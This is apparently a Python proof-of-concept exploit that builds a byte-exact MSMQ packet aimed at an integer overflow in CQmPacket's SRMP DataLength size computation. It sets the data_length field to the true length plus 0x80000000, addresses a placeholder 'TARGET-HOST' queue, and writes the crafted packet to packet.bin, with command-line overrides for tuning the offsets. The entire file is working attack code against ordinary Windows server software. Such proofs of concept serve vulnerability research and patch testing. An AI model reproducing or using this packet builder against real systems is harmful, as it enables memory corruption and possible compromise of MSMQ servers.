#!/usr/bin/env python3
"""CONSTRUCT: build the MSMQ packet that reaches CQmPacket's SRMP DataLength overflow.
Byte-exact replica of the documented structure; the ONE derived-vulnerable field is
SRMPEnvelopeHeader.data_length, set to overflow the size computation."""
import struct, sys
BE=lambda n,v: v.to_bytes(n,'big'); LE=lambda n,v: v.to_bytes(n,'little')
dl_override = int(sys.argv[1],0) if len(sys.argv)>1 else None
mbo = int(sys.argv[2],0) if len(sys.argv)>2 else 995
mbs = int(sys.argv[3],0) if len(sys.argv)>3 else 7
psize_override = int(sys.argv[4],0) if len(sys.argv)>4 else None

# --- BaseHeader ---
base = b''
base += LE(1,16) + LE(1,0) + BE(2,768) + BE(4,0x4C494F52)   # ver,resv,flags,sig 'LIOR'
# packet_size (off 8) + ttrq patched after we know total
base_tail = LE(4,0xFFFFFFFF)                                  # time_to_reach_queue

# --- UserHeader ---
dest = ("http://TARGET-HOST/msmq/private$/queuejumper\x00").encode('utf-16le')
uh  = b'\x00'*16 + b'\x00'*16
uh += LE(4,0) + LE(4,1690217059) + LE(4,1) + BE(4,18620418)
uh += LE(2,len(dest)) + dest
uh += b'\x00'*((4-(len(uh)%4))%4)

# --- MessagePropertiesHeader ---
label=("poc\x00").encode('utf-16le')
mp  = LE(1,0)+LE(1,len(label)//2)+BE(2,0)+b'\x00'*20
mp += BE(4,0)*8                                               # body_type..extension_size
mp += label

# --- SRMPEnvelopeHeader ---
soap=("<se:Envelope xmlns:se=\"http://schemas.xmlsoap.org/soap/envelope/\" \r\n"
      "xmlns=\"http://schemas.xmlsoap.org/srmp/\">\r\n<se:Header>\r\n"
      "<path xmlns=\"http://schemas.xmlsoap.org/rp/\" se:mustUnderstand=\"1\">\r\n"
      "<action>MSMQ:poc</action>\r\n<to>http://TARGET-HOST/msmq/private$/queuejumper</to>\r\n"
      "<id>uuid:1@00000000-0000-0000-0000-000000000000</id>\r\n</path>\r\n"
      "<properties se:mustUnderstand=\"1\">\r\n<expiresAt>20600609T164419</expiresAt>\r\n"
      "<sentAt>20230724T164419</sentAt>\r\n</properties>\r\n</se:Header>\r\n"
      "<se:Body></se:Body>\r\n</se:Envelope>\r\n\r\n\x00").encode('utf-16le')
real_dl=len(soap)//2
dl = dl_override if dl_override is not None else (real_dl + 0x80000000)
srmp = BE(2,0)+BE(2,0)+LE(4,dl)+soap
srmp += b'\x00'*((4-(len(srmp)%4))%4)

# --- CompoundMessageHeader ---
http=("POST /msmq HTTP/1.1\r\nContent-Length: 816\r\nHost: x\r\n\r\nMessage\x00").encode()
cm = LE(2,500)+BE(2,0)+LE(4,len(http))+LE(4,mbs)+LE(4,mbo)+http

# --- ExtensionHeader ---
ext = LE(4,12)+LE(4,0)+LE(1,0)+b'\x00'*3

body = base + b'\x00\x00\x00\x00' + base_tail + uh + mp + srmp + cm + ext
total = len(body)
psz = psize_override if psize_override is not None else total
pkt = base + LE(4,psz) + base_tail + uh + mp + srmp + cm + ext   # packet_size at off 8
open('packet.bin','wb').write(pkt)
print("packet %d bytes, real_dl=%d, data_length=0x%x -> packet.bin"%(len(pkt),real_dl,dl))
